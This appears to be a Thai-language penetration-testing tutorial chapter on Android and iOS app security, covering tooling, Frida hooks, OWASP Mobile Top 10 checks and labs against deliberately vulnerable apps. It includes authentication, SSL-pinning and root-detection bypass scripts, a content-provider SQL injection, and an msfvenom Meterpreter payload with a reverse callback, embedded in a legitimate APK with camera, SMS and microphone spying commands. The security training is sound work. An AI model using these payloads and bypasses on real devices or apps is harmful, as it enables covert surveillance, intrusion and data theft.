# Part 56: Mobile Application Security (ความปลอดภัยแอปพลิเคชันมือถือ)

## สารบัญ
1. [Mobile Security Overview](#1-mobile-security-overview)
2. [Android Penetration Testing](#2-android-penetration-testing)
3. [iOS Penetration Testing](#3-ios-penetration-testing)
4. [OWASP Mobile Top 10](#4-owasp-mobile-top-10)
5. [Static Analysis](#5-static-analysis)
6. [Dynamic Analysis](#6-dynamic-analysis)
7. [Network Traffic Analysis](#7-network-traffic-analysis)
8. [Mobile Malware Analysis](#8-mobile-malware-analysis)
9. [แบบฝึกหัด Lab](#9-แบบฝึกหัด-lab)

---

## 1. Mobile Security Overview

### 1.1 สภาพแวดล้อมความปลอดภัย

```
Mobile Attack Surface:

+------------------+
|  Mobile Device   |
+------------------+
| - OS (Android/iOS)
| - Applications    |
| - Storage         |
| - Sensors/HW      |
+------------------+
        |
        v
+------------------+       +------------------+
| Network Traffic  |<----->| Backend API      |
+------------------+       +------------------+
                                   |
                                   v
                          +------------------+
                          | Web Application  |
                          | Database         |
                          +------------------+

Attack Vectors:
1. Insecure data storage
2. Insecure communication
3. Insecure authentication
4. Insufficient cryptography
5. Insecure code
6. Third-party libraries
7. Client-side injection
8. Security misconfigurations
```

### 1.2 ติดตั้ง Environment

```bash
# ติดตั้ง Android tools
sudo apt install -y android-tools-adb android-tools-fastboot

# ติดตั้ง Jadx (APK decompiler)
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.4.7.zip
unzip jadx-1.4.7.zip -d ~/jadx
export PATH=$PATH:~/jadx/bin

# ติดตั้ง Apktool
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://github.com/iBotPeaches/Apktool/releases/latest/download/apktool_2.9.3.jar
chmod +x apktool
sudo mv apktool apktool_2.9.3.jar /usr/local/bin/

# ติดตั้ง Frida
pip3 install frida-tools

# ติดตั้ง MobSF (สำหรับ automated analysis)
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# ติดตั้ง Drozer
pip3 install drozer

# ADB (Android Debug Bridge)
adb devices
adb connect 10.0.2.2  # เชื่อมต่อ emulator
adb shell
```

---

## 2. Android Penetration Testing

### 2.1 ADB Commands

```bash
# ตรวจสอบ devices
adb devices
adb -s <device_id> shell

# ข้อมูล device
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release
adb shell getprop ro.product.cpu.abi

# ติดตั้ง/ถอน APK
adb install app.apk
adb uninstall com.example.app

# Pull APK จาก device
adb shell pm path com.example.app
adb pull /data/app/com.example.app-1/base.apk

# ดู installed packages
adb shell pm list packages
adb shell pm list packages -3  # third-party only
adb shell pm list packages | grep -i target

# ดู app permissions
adb shell dumpsys package com.example.app

# Log cat
adb logcat
adb logcat -s "tag_name"
adb logcat | grep -i password

# File operations
adb pull /sdcard/Download/file.pdf /tmp/
adb push exploit.apk /sdcard/

# Screenshot
adb shell screencap -p /sdcard/screen.png
adb pull /sdcard/screen.png

# Screen record
adb shell screenrecord /sdcard/record.mp4
adb pull /sdcard/record.mp4
```

### 2.2 APK Analysis

```bash
# Decompile APK ด้วย apktool
apktool d app.apk -o app_decompiled
cd app_decompiled

# ดูโครงสร้าง
ls -la
# AndroidManifest.xml <- permissions, activities, etc.
# smali/            <- bytecode (คล้าย assembly)
# res/              <- resources
# assets/           <- static files

# วิเคราะห์ AndroidManifest.xml
cat AndroidManifest.xml | python3 -c "
import sys, xml.etree.ElementTree as ET
tree = ET.parse(sys.stdin)
root = tree.getroot()

# ดู permissions
print('=== PERMISSIONS ===')
for perm in root.findall('./uses-permission'):
    print(' ', perm.attrib.get('{http://schemas.android.com/apk/res/android}name', ''))

# ดู activities
print('\n=== ACTIVITIES ===')
for activity in root.iter('activity'):
    name = activity.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
    exported = activity.attrib.get('{http://schemas.android.com/apk/res/android}exported', 'false')
    print(f'  {name} (exported={exported})')
"

# Decompile เป็น Java source code ด้วย jadx
jadx -d app_java/ app.apk

# ค้นหา sensitive data
grep -r 'password\|secret\|key\|token\|api' app_java/ -i
grep -r 'http://\|https://' app_java/
grep -r 'AES\|DES\|MD5\|SHA1' app_java/
grep -r 'Log.d\|Log.e\|Log.v' app_java/  # debug logs

# ค้นหา hardcoded secrets
grep -r 'apiKey\|api_key\|SECRET\|PRIVATE' app_java/ -i

# บันทึกคืน APK (หลังแก้ไข)
apktool b app_decompiled/ -o app_patched.apk
```

### 2.3 Dynamic Analysis ด้วย Frida

```javascript
// frida_basic.js - basic API hooking
Java.perform(function() {
    // Hook java.lang.Stringเพื่อดูข้อความ
    var String = Java.use('java.lang.String');
    
    // Hook login function
    var LoginActivity = Java.use('com.example.app.LoginActivity');
    LoginActivity.checkPassword.implementation = function(username, password) {
        console.log('[+] checkPassword called');
        console.log('    Username:', username);
        console.log('    Password:', password);
        
        // เรียก original function
        var result = this.checkPassword(username, password);
        console.log('    Result:', result);
        
        // bypass: ตอบ true เสมอ
        return true;  // bypass authentication!
    };
    
    // Hook crypto operations
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[+] Cipher.doFinal input:', Java.array('byte', input));
        var result = this.doFinal(input);
        console.log('[+] Cipher.doFinal output:', Java.array('byte', result));
        return result;
    };
});
```

```bash
# เริ่ม Frida server บน device
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# List running processes
frida-ps -U  # USB connected device
frida-ps -D <device_id>  # specific device

# Inject script
frida -U -l frida_basic.js -f com.example.app  # spawn
frida -U -l frida_basic.js com.example.app      # attach to running

# ใช้ frida-trace
frida-trace -U -j 'com.example.app!*' -f com.example.app
frida-trace -U -i 'open*' -f com.example.app  # trace native functions
```

### 2.4 Drozer Framework

```bash
# ติดตั้ง Drozer agent บน device
adb install drozer-agent.apk

# เชื่อมต่อ Drozer
adb forward tcp:31415 tcp:31415
drozer console connect

# Enumerate app attack surface
dz> run app.package.attacksurface com.example.app

# Activities
dz> run app.activity.info -a com.example.app
dz> run app.activity.start --component com.example.app com.example.app.AdminActivity

# Content Providers
dz> run app.provider.info -a com.example.app
dz> run app.provider.query content://com.example.app.provider/users
dz> run app.provider.query content://com.example.app.provider/users --selection "1=1"

# SQL Injection ใน Content Provider
dz> run app.provider.query content://com.example.app.provider/users \
    --selection "1=1)-- " 

# Services
dz> run app.service.info -a com.example.app
dz> run app.service.start --action com.example.app.SERVICE

# Broadcast Receivers
dz> run app.broadcast.info -a com.example.app
dz> run app.broadcast.send --component com.example.app.MyReceiver \
    --action com.example.app.BROADCAST \
    --extra string key value

# Intent injection
dz> run app.activity.start --component com.example.app \
    com.example.app.DeepLinkActivity \
    --data-uri 'app://transfer?from=alice&to=bob&amount=9999'
```

---

## 3. iOS Penetration Testing

### 3.1 iOS Security Architecture

```
iOS Security Layers:

+---------------------------+
| Application Layer         |  App Store validation, code signing
+---------------------------+
| Data Security             |  Keychain, Data Protection API
+---------------------------+
| App Security              |  Sandboxing, permissions
+---------------------------+
| Network Security          |  ATS, certificate pinning
+---------------------------+
| Hardware Security         |  Secure Enclave, Touch/Face ID
+---------------------------+

iOS Vulnerabilities:
- Jailbreak bypass
- Weak keychain storage
- Insecure data files
- Network traffic (no cert pinning)
- Reverse engineering
- Jailbroken device attacks
```

### 3.2 iOS Testing ด้วย Frida

```javascript
// ios_frida.js

// Bypass SSL Pinning
var TrustKit = ObjC.classes.TrustKit;
if (TrustKit) {
    console.log('[+] TrustKit found, bypassing...');
    ObjC.classes.TrustKit['+ sharedTrustKit'].pinningValidator
        .implementation = function() {
        return ObjC.classes.TSKSPKIHashCache.alloc().init();
    };
}

// Bypass via SecTrustEvaluate
var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
Interceptor.attach(SecTrustEvaluate, {
    onLeave: function(retval) {
        retval.replace(0);  // return errSecSuccess
        console.log('[+] SSL bypass: SecTrustEvaluate');
    }
});

// Bypass jailbreak detection
if (ObjC.available) {
    // Hook file existence checks
    var NSFileManager = ObjC.classes.NSFileManager;
    var orig_fileExistsAtPath = NSFileManager['- fileExistsAtPath:'].implementation;
    
    NSFileManager['- fileExistsAtPath:'].implementation = ObjC.implement(
        NSFileManager['- fileExistsAtPath:'],
        function(self, sel, path) {
            var pathStr = new ObjC.Object(path).toString();
            var jailbreakPaths = [
                '/Applications/Cydia.app',
                '/usr/sbin/sshd',
                '/etc/apt',
                '/private/var/lib/apt/'
            ];
            
            for (var i = 0; i < jailbreakPaths.length; i++) {
                if (pathStr === jailbreakPaths[i]) {
                    console.log('[+] Jailbreak check blocked:', pathStr);
                    return false;  // pretend file doesn't exist
                }
            }
            
            return orig_fileExistsAtPath.call(self, sel, path);
        }
    );
}
```

```bash
# Frida สำหรับ iOS
# ติดตั้ง frida-server บน jailbroken device
# (ผ่าน Cydia หรือคือนค้าอื่น)

# SSH เข้าไป jailbroken device
ssh root@<device_ip>  # password: alpine (default)

# List apps
frida-ps -H <device_ip>

# Inject script
frida -H <device_ip> -l ios_frida.js -f com.example.app

# Dump Keychain
frida -H <device_ip> -l keychain_dump.js com.example.app
```

### 3.3 iOS Static Analysis

```bash
# ติดตั้ง tools
brew install class-dump
brew install ios-deploy

# Unzip IPA
cp app.ipa app.zip
unzip app.zip -d app_extracted
cd app_extracted/Payload/*.app

# ดูโครงสร้าง
ls -la
# Binary executable (Mach-O)
# Info.plist
# Resources/
# Frameworks/

# Dump class headers
class-dump app_binary > headers.h
grep -i 'password\|secret\|key\|token' headers.h

# Strings จาก binary
strings app_binary | grep -i 'http\|password\|key\|token'

# ดู Info.plist
cat Info.plist
# NSAllowsArbitraryLoads: true <- insecure!

# Analyze binary architecture
file app_binary
otool -l app_binary | grep -A 3 LC_ENCRYPTION  # check if encrypted
rabin2 -I app_binary  # radare2
```

---

## 4. OWASP Mobile Top 10

### M1: Improper Platform Usage

```bash
# ตรวจสอบ exported components
cat AndroidManifest.xml | grep 'exported="true"'

# Test exported activity
adb shell am start -n com.example.app/.AdminActivity

# Test deep links
adb shell am start -a android.intent.action.VIEW \
    -d 'app://example.com/admin' \
    com.example.app

# iOS: URL schemes
# Info.plist
# <key>CFBundleURLSchemes</key>
# <array><string>myapp</string></array>
```

### M2: Insecure Data Storage

```bash
# Android
# ตรวจสอบ SharedPreferences
adb shell cat /data/data/com.example.app/shared_prefs/*.xml

# SQLite databases
adb shell ls /data/data/com.example.app/databases/
adb pull /data/data/com.example.app/databases/app.db
sqlite3 app.db
.tables
SELECT * FROM users;

# External storage
adb shell ls /sdcard/Android/data/com.example.app/

# iOS
# ตรวจสอบ NSUserDefaults
cat /private/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/*.plist

# SQLite
find /private/var/mobile/Containers/Data/Application/<UUID> -name "*.sqlite"

# Keychain dump (jailbroken)
frida -H <ip> -l keychain_dump.js com.example.app
```

### M3: Insecure Communication

```bash
# ตั้ง Burp Suite proxy
# device -> Burp -> server

# Android: ติดตั้ง Burp CA certificate
adb push burp_cert.der /sdcard/
# ติดตั้งผ่าน Settings > Security > Install Certificate

# ตั้งค่า proxy บน Android emulator
adb shell settings put global http_proxy 10.0.2.2:8080
# เซือด proxy:
adb shell settings put global http_proxy :0

# iOS: ติดตั้งการ trust Burp CA
# Settings > General > VPN & Device Management > Trust certificate

# Bypass SSL Pinning ด้วย Frida
pip3 install objection
objection -g com.example.app explore
# android sslpinning disable
# ios sslpinning disable

# หรือใช้ apk-mitm
npm install -g apk-mitm
apk-mitm app.apk  # สร้าง patched APK อัตโนมัติ
```

### M4: Insufficient Authentication

```bash
# ตรวจสอบ weak authentication
# 1. Default credentials (admin/admin, test/test)
# 2. Brute force protection
# 3. Session token quality

# JWT token analysis
# ดู token จาก Burp
echo 'eyJhbGciOiJIUzI1NiJ9...' | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
for i, part in enumerate(parts[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    print(f'Part {i}:', json.loads(decoded))
"

# Crack JWT secret
pip3 install jwt-cracker
jwt-cracker 'eyJhbGc...' rockyou.txt

# Bypass biometric auth ด้วย Frida
# Android
Java.perform(function() {
    var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
    // หรือ hook fragment BiometricPrompt
});
```

---

## 5. Static Analysis

### 5.1 MobSF Automated Analysis

```bash
# เริ่ม MobSF
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# API สำหรับ automated scanning
export MOBSF_API_KEY="your_api_key"  # หาจาก MobSF settings

# Upload APK
curl -F 'file=@app.apk' http://localhost:8000/api/v1/upload \
    -H "Authorization: $MOBSF_API_KEY"

# Start scan
curl --data "hash=<file_hash>&scan_type=apk" \
    http://localhost:8000/api/v1/scan \
    -H "Authorization: $MOBSF_API_KEY"

# Get report
curl http://localhost:8000/api/v1/report_json \
    -d "hash=<file_hash>" \
    -H "Authorization: $MOBSF_API_KEY"
```

### 5.2 Manual Code Review

```python
#!/usr/bin/env python3
# android_static_scan.py
import os, re, json

def scan_directory(directory):
    findings = []
    
    patterns = {
        'hardcoded_password': r'(password|passwd|pwd)\s*=\s*["\'][^"\']{4,}["\']',
        'hardcoded_key': r'(api_?key|secret_?key|private_?key)\s*=\s*["\'][^"\']+["\']',
        'http_url': r'http://[\w./-]+',  # insecure HTTP
        'debug_log': r'Log\.[devwiDEVWI]\(',
        'weak_crypto': r'(MD5|DES|RC4|ECB)',
        'insecure_random': r'new Random\(\)',
        'sql_injection_risk': r'\+\s*["\'][^"\'].*\+.*["\']',
        'path_traversal_risk': r'\.\./',
        'intent_data': r'\.getData\(\)',
    }
    
    for root, dirs, files in os.walk(directory):
        for filename in files:
            if not filename.endswith(('.java', '.kt', '.xml', '.json')):
                continue
            
            filepath = os.path.join(root, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    lines = content.split('\n')
                    
                    for pattern_name, pattern in patterns.items():
                        for i, line in enumerate(lines, 1):
                            if re.search(pattern, line, re.IGNORECASE):
                                findings.append({
                                    'file': filepath,
                                    'line': i,
                                    'type': pattern_name,
                                    'content': line.strip()
                                })
            except:
                pass
    
    return findings

# Run
results = scan_directory('./app_decompiled')

# แสดงผล
 for r in results:
    print(f"[{r['type']}] {r['file']}:{r['line']}")
    print(f"  {r['content']}")
    print()

# Export
with open('static_scan_report.json', 'w') as f:
    json.dump(results, f, indent=2)
```

---

## 6. Dynamic Analysis

### 6.1 Objection Framework

```bash
# ติดตั้ง
pip3 install objection

# Attach to running app
objection -g com.example.app explore

# === Android Commands ===
# ดู activities
android hooking list activities

# Hook all methods ของ class
android hooking watch class com.example.app.AuthManager

# Hook specific method
android hooking watch class_method com.example.app.AuthManager.login

# Bypass root detection
android root disable

# Bypass SSL Pinning
android sslpinning disable

# ดู environment variables
env

# Filesystem
ls -la /data/data/com.example.app/
cat /data/data/com.example.app/shared_prefs/credentials.xml

# SQLite
sqlite connect /data/data/com.example.app/databases/app.db
sqlite execute query 'SELECT * FROM users'

# Memory
memory list modules
memory search --string "password"

# === iOS Commands ===
# Keychain
ios keychain dump

# UserDefaults
ios nsuserdefaults get

# SSL Pinning
ios sslpinning disable

# Jailbreak bypass
ios jailbreak disable

# ดู URL handlers
ios hooking list url_handlers
```

### 6.2 Frida Advanced Hooks

```javascript
// android_advanced_hooks.js

Java.perform(function() {
    // Hook HTTP requests
    var URL = Java.use('java.net.URL');
    URL.$init.overload('java.lang.String').implementation = function(url) {
        console.log('[+] HTTP Request:', url);
        return this.$init(url);
    };
    
    // Hook SharedPreferences
    var SharedPreferences = Java.use('android.app.SharedPreferencesImpl');
    SharedPreferences.getString.implementation = function(key, defValue) {
        var result = this.getString(key, defValue);
        console.log('[+] SharedPreferences.getString:', key, '=', result);
        return result;
    };
    
    // Hook crypto
    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(keyBytes, algorithm) {
        var keyHex = '';
        for (var i = 0; i < keyBytes.length; i++) {
            keyHex += ('0' + (keyBytes[i] & 0xFF).toString(16)).slice(-2);
        }
        console.log('[+] Crypto Key (' + algorithm + '):', keyHex);
        return this.$init(keyBytes, algorithm);
    };
    
    // Intercept all SQLite queries
    var SQLiteDatabase = Java.use('android.database.sqlite.SQLiteDatabase');
    SQLiteDatabase.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function(sql, args) {
        console.log('[+] SQL Query:', sql);
        if (args) console.log('    Args:', Java.array('java.lang.String', args));
        return this.rawQuery(sql, args);
    };
});
```

---

## 7. Network Traffic Analysis

### 7.1 Intercepting Mobile Traffic

```bash
# เพิ่ม proxy (ใช้ร่วมกับ Burp Suite)
# เอา Burp Certificate ใส่ Android 7+

# Download Burp CA
curl -x 127.0.0.1:8080 http://burp/cert -o burp_cert.der

# Convert DER to PEM
openssl x509 -inform der -in burp_cert.der -out burp_cert.pem

# Get cert hash
cert_hash=$(openssl x509 -subject_hash_old -in burp_cert.pem | head -1)

# Rename และ push ไปยัง system cert store (root required)
cp burp_cert.pem ${cert_hash}.0
adb root
adb remount
adb push ${cert_hash}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${cert_hash}.0
adb reboot

# เทคนิค Network Security Config bypass
# แก้ไข AndroidManifest.xml
# <network-security-config>
#     <base-config><trust-anchors>
#         <certificates src="user"/>
#     </trust-anchors></base-config>
# </network-security-config>

# ใช้ apk-mitm
apk-mitm app.apk
# สร้าง app-patched.apk ที่ accept user certs
```

### 7.2 Protocol Analysis

```python
#!/usr/bin/env python3
# mobile_traffic_analyzer.py
import mitmproxy.http
from mitmproxy import ctx
import json, re

class MobileAnalyzer:
    def __init__(self):
        self.findings = []
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        req = flow.request
        
        # Log all requests
        ctx.log.info(f"[>] {req.method} {req.url}")
        
        # Check for sensitive data in URL
        sensitive_patterns = ['password', 'token', 'secret', 'key', 'auth']
        for pattern in sensitive_patterns:
            if pattern in req.url.lower():
                self.findings.append({
                    'type': 'Sensitive URL',
                    'url': req.url
                })
        
        # Check Content-Type
        content_type = req.headers.get('content-type', '')
        if req.method == 'POST' and 'application/json' in content_type:
            try:
                body = json.loads(req.content)
                # Check for sensitive fields
                self._check_json(body, req.url)
            except:
                pass
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        resp = flow.response
        
        # Check for sensitive data in response
        if resp.headers.get('content-type', '').startswith('application/json'):
            try:
                body = json.loads(resp.content)
                self._check_json(body, flow.request.url + ' [RESPONSE]')
            except:
                pass
        
        # Check security headers
        missing_headers = []
        security_headers = ['Strict-Transport-Security', 'X-Content-Type-Options', 
                           'X-Frame-Options', 'Content-Security-Policy']
        for header in security_headers:
            if header not in resp.headers:
                missing_headers.append(header)
        
        if missing_headers:
            ctx.log.warn(f"Missing security headers: {missing_headers}")
    
    def _check_json(self, data, source):
        sensitive_keys = ['password', 'secret', 'token', 'key', 'credit_card']
        
        def traverse(obj, path=""):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    full_path = f"{path}.{k}" if path else k
                    if any(s in k.lower() for s in sensitive_keys):
                        self.findings.append({
                            'type': 'Sensitive Field',
                            'source': source,
                            'field': full_path,
                            'value': str(v)[:50]
                        })
                    traverse(v, full_path)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    traverse(item, f"{path}[{i}]")
        
        traverse(data)

addons = [MobileAnalyzer()]
```

```bash
# เริ่ม mitmproxy ด้วย script
mitmproxy -s mobile_traffic_analyzer.py --listen-port 8080

# หรือใช้ Burp Suite
# Proxy > Intercept > ดู requests
```

---

## 8. Mobile Malware Analysis

### 8.1 Android Malware Analysis

```bash
# ตรวจสอบ APK permissions
aapt dump permissions suspicious.apk
# ต้องระวัง:
# SEND_SMS, READ_CONTACTS, RECORD_AUDIO, ACCESS_FINE_LOCATION
# RECEIVE_BOOT_COMPLETED (autostart)
# READ_SMS, RECEIVE_SMS

# เปรียบเทียบ hash กับ VirusTotal
md5sum suspicious.apk
sha256sum suspicious.apk
curl -s "https://www.virustotal.com/vtapi/v2/file/report?apikey=<KEY>&resource=<SHA256>"

# วิเคราะห์ ด้วย jadx
jadx -d malware_java/ suspicious.apk

# ค้นหา C2 (Command & Control) servers
grep -r 'http\|socket\|ip' malware_java/ -i | grep -v '.xml' | head -20
grep -r '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' malware_java/

# ค้นหา obfuscation
grep -r 'Base64\|decrypt\|decipher\|decode' malware_java/ -i

# Dynamic การวิเคราะห์
# ใช้ sandbox (Cuckoo, Any.run, Hybrid Analysis)
docker run -it cuckoo/cuckoo submit suspicious.apk
```

### 8.2 สร้าง Android RAT สำหรับการไต่สวน (Testing)

```bash
# msfvenom - สร้าง Android payload
msfvenom -p android/meterpreter/reverse_https \
    LHOST=10.10.10.1 \
    LPORT=443 \
    -o malware_test.apk

# Embed ใน app จริง
msfvenom -p android/meterpreter/reverse_https \
    LHOST=10.10.10.1 \
    LPORT=443 \
    -x legitimate_app.apk \
    -o infected_app.apk

# เริ่ม listener
msfconsole -q
use multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 10.10.10.1
set LPORT 443
exploit -j

# Meterpreter เมื่อ connect มา
sessions -i 1
help
cam_snap            # ถ่ายภาพจากกล้อง
dump_sms            # อ่าน SMS
geolocate           # ดู GPS location
record_mic          # เปิด microphone
dump_contacts       # อ่าน contacts
shell               # เปิด shell
```

---

## 9. แบบฝึกหัด Lab

### Lab 1: Android Static Analysis

```bash
# ดาวน์โหลด DIVA (Damn Insecure and Vulnerable App)
wget https://github.com/payatu/diva-android/raw/master/DivaApplication.apk

# Decompile
jadx -d diva_java/ DivaApplication.apk

# Challenge 1: Hardcoded Secrets
grep -r 'hardcode\|secret\|password' diva_java/ -i
# หรือใช้ MobSF

# Challenge 2: Insecure Logging
grep -r 'Log\.d\|Log\.e\|Log\.v' diva_java/
adb logcat | grep -i 'DIVA'

# Challenge 3: Insecure Data Storage
adb shell cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
```

### Lab 2: SSL Pinning Bypass

```bash
# ใช้ app ที่มี SSL pinning (DVIA, UnCrackable)

# วิธี 1: Objection
objection -g com.test.app explore
# > android sslpinning disable

# วิธี 2: Frida script
frida -U -l ssl_bypass.js -f com.test.app

# ssl_bypass.js
Java.perform(function() {
    var TrustManager = Java.use('com.test.app.network.TrustManager');
    TrustManager.checkServerTrusted.implementation = function() {
        console.log('[+] checkServerTrusted bypassed');
    };
});

# วิธี 3: apk-mitm
apk-mitm com.test.app.apk
adb install com.test.app-patched.apk
```

### Lab 3: Root Detection Bypass

```javascript
// root_bypass.js
Java.perform(function() {
    // Bypass su binary check
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1) {
            console.log('[+] Blocked su check:', cmd);
            throw Java.use('java.io.IOException').$new();
        }
        return this.exec(cmd);
    };
    
    // Bypass file existence check
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = ['/system/app/Superuser.apk', '/sbin/su', '/system/bin/su'];
        if (rootPaths.indexOf(path) !== -1) {
            console.log('[+] Root check bypassed:', path);
            return false;
        }
        return this.exists();
    };
});
```

### สรุป Mobile Security Tools

| เครื่องมือ | การใช้งาน |
|-----------|----------|
| ADB | Device communication |
| jadx/apktool | APK decompilation |
| Frida | Dynamic instrumentation |
| Objection | Mobile exploration |
| MobSF | Automated analysis |
| Drozer | Android attack framework |
| Burp Suite | Traffic interception |
| apk-mitm | SSL bypass patch |
| Ghidra/IDA | Native code analysis |
| class-dump | iOS header extraction |

---

← [Part 55: Container Security](Part-55-Container-Security.md) | [Part 57: API Security Testing](Part-57-API-Security.md) →
